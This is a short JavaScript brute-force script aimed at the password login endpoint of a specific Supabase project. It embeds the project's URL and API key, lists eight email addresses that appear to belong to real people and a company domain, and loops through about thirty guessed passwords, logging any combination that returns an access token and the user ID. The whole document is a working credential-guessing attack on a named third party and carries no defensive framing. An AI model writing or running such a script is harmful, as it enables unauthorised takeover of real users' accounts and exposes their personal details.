const url='https://pnnuqwdcgoympgddrvze.supabase.co/auth/v1/token?grant_type=password';
const key='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBubnVxd2RjZ295bXBnZGRydnplIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA2MjgxNDgsImV4cCI6MjA4NjIwNDE0OH0.ovuhuCAdK3guWchqKDWK7MA-qv8cmhO0xdrGuv7M7fY';

const emails = ['jan@paulides.nl','janpa@trifinity.nl','admin@trifinity.nl','demo@trifinity.nl','test@trifinity.nl','user@trifinity.nl','dev@trifinity.nl','test@test.nl'];
const passwords = ['Welkom01!','welkom01','Wachtwoord1!','Admin123!','Trifinity1!','trifinity','jan123456','JanPa2024!','finance123','FinFirst1!','fin-first','Welcome1!','password','123456','qwerty','letmein','welcome','monkey','dragon','master','login','abc123','admin','1234','test','demo','user1234','P@ssw0rd1','Supabase1!'];

let found = false;
for (const email of emails) {
  if (found) break;
  for (const p of passwords) {
    if (found) break;
    try {
      const r = await fetch(url, {
        method: 'POST',
        headers: {'apikey': key, 'Content-Type': 'application/json'},
        body: JSON.stringify({email, password: p})
      });
      const d = await r.json();
      if (d.access_token) {
        console.log('SUCCESS: ' + email + ' / ' + p);
        console.log('User ID: ' + d.user.id);
        found = true;
      }
    } catch(e) { /* ignore */ }
  }
  if (!found) console.log(email + ': no match');
}
if (!found) console.log('NO WORKING CREDENTIALS FOUND');
